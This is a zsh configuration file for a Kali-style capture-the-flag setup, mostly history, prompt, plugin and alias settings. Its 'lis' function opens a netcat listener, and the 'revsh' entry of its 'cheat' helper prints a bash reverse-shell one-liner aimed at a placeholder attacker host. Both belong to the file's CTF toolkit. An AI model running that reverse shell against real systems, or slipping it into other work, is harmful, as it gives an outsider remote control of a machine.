# ~/.zshrc — kali-nordic (arranque < 150 ms, render del prompt < 30 ms)
typeset -U path
path=(~/.local/bin /usr/local/bin $path)
export EDITOR=nano VISUAL=nano

# ── Historial ────────────────────────────────────────────────────────────────
HISTFILE="$HOME/.cache/nordic/zsh-history"
HISTSIZE=10000
SAVEHIST=10000
setopt share_history hist_ignore_all_dups hist_reduce_blanks auto_cd interactive_comments
unsetopt beep
setopt prompt_subst

# ── Estado TARGET / VPN (lectura barata, ~0 ms, export a nuevas shells) ──────
typeset -g TARGET TARGET_NAME VPN_IP
__nordic_read_state() {
    local f="$HOME/.cache/nordic/target"
    [ -r /run/nordic/target ] && f=/run/nordic/target
    if [ -s "$f" ]; then
        local line="$1"
        read -r line < "$f"
        TARGET="${line%%|*}"
        TARGET_NAME="${line#*|}"
        [ "$TARGET_NAME" = "$line" ] && TARGET_NAME=""
    else
        TARGET=""; TARGET_NAME=""
    fi
    VPN_IP=""
    if command -v ip >/dev/null 2>&1; then
        local dev
        dev=$(ip -o link 2>/dev/null | awk -F': ' '{print $2}' | grep -Eo '^(tun|wg|tailscale|ppp)[a-zA-Z0-9]*' | head -1)
        [ -n "$dev" ] && VPN_IP=$(ip -4 -o addr show dev "$dev" 2>/dev/null | awk 'NR==1{print $4}' | cut -d/ -f1)
    fi
}
__nordic_hook() { __nordic_read_state; }
autoload -Uz add-zsh-hook
add-zsh-hook precmd __nordic_hook

# ── Prompt (doble línea, iconos Nerd Font, calavera Frost/rojo Aurora en root) ─
# ── Prompt: powerlevel10k *Nord Frost* (config en ~/.p10k.zsh) ────
# El precmd de __nordic_hook (registrado arriba) refresca $TARGET/$VPN_IP antes
# de que los segmentos custom de p10k (nordic_target/nordic_vpn) se rendericen.
if [ -r "$HOME/.powerlevel10k/powerlevel10k.zsh-theme" ]; then
    [ -r "$HOME/.p10k.zsh" ] && source "$HOME/.p10k.zsh"
    source "$HOME/.powerlevel10k/powerlevel10k.zsh-theme"
else
    # fallback minimal si p10k no está
    PROMPT='%F{#88C0D0} %n %F{#81A1C1}%4~%f ❯ '
fi

# ── Completions ──────────────────────────────────────────────────────────────
autoload -Uz compinit
compinit -d "$HOME/.cache/nordic/zcompdump"
zstyle ':completion:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'

# ── Plugins con carga diferida (solo si existen) ─────────────────────────────
[ -f /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh ] \
    && source /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
[ -f /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] \
    && source /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh

# fzf (Ctrl-R)
if command -v fzf >/dev/null 2>&1; then
    source /usr/share/doc/fzf/examples/key-bindings.zsh 2>/dev/null
fi
command -v zoxide >/dev/null 2>&1 && eval "$(zoxide init zsh)"

# ── Terminator nordic aliases + herramientas CTF ────────────────────────────
alias cat='bat --style=plain --theme=Nord'
alias ls='eza --icons --group-directories-first'
alias ll='eza --icons -la --group-directories-first --git'
alias fd=fdfind
alias bat=batcat
alias grep='grep --color=auto'
alias lessm='less -R'

alias myip="ip -brief addr show && echo ' externa:' \$(curl -s --max-time 3 ifconfig.me)"
alias ports="ss -tulnp"
alias serve="python3 -m http.server 8000"


checkvpn() {
    local dev
    dev=$(ip -o link 2>/dev/null | awk -F': ' '{print $2}' | grep -E '^(tun|wg|tailscale|ppp)' | head -1)
    if [ -n "$dev" ]; then
        echo " VPN activa en ${dev}: $(ip -4 -o addr show dev "$dev" 2>/dev/null | awk 'NR==1{print $4}')"
    else
        echo " VPN off"
    fi
}
alias vpn=checkvpn

ctfinit() {
    if [ -z "$1" ]; then
        echo "uso: ctfinit <nombre> [IP]"
        return 1
    fi
    local name="$1"
    mkdir -p "$HOME/ctf/$name"/{nmap,web,exploits,loot,notes}
    echo " ~/ctf/$name listo (nmap · web · exploits · loot · notes)"
    [ -n "$2" ] && settarget "$2" "${name}"
    [ -f "$HOME/ctf/$name/notes/README.md" ] || echo "# ${name} — notas de sesión" > "$HOME/ctf/$name/notes/README.md"
}
lis() {
    [ -n "$1" ] || { echo "uso: lis <puerto>"; return 1; }
    echo " listener nc nvnp en $1 "
    rlwrap nc -lvnp "$1"
}
extract() {
    case "$1" in
        *.tar.bz2|*.tbz2) tar xjf "$1" ;;
        *.tar.gz|*.tgz)   tar xzf "$1" ;;
        *.tar.xz)         tar xJf "$1" ;;
        *.zip)            unzip "$1" ;;
        *.7z)             7z x "$1" ;;
        *.rar)            unrar x "$1" ;;
        *) echo " formato no soportado: $1" ;;
    esac
}
cheat() {
    case "$1" in
        nmap)  echo "nmap -sVC -p- $TARGET" ;;
        http)  echo "gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt" ;;
        smb)   echo "nmap --script smb-vuln* -p 139,445 $TARGET" ;;
        revsh) echo "bash -i >& /dev/tcp/<attacker>/<port> 0>&1" ;;
        *)     echo "temas: nmap · http · smb · revsh" ;;
    esac
}
